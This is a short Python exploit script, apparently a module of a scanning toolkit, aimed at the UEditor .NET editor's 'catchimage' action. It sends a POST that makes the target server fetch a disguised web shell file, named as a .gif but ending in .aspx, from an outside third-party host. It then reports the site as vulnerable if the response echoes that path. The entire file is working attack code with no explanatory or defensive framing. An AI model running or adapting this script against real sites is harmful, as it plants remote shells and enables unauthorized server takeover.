#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/Ueditor/net/controller.ashx?action=catchimage"
bug = "source\":\"http://www.baishagedou.com/dedecms/ppxshell.gif?.aspx"
info ="ueditor"
post ="source%5B%5D=http%3A%2F%2Fwww.baishagedou.com%2Fdedecms%2Fppxshell.gif%3F.aspx"
qian ="url\":"


def main():
    res = HttpPost(url+payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info)#,GettextMiddle(res[0],qian,hou));


main()
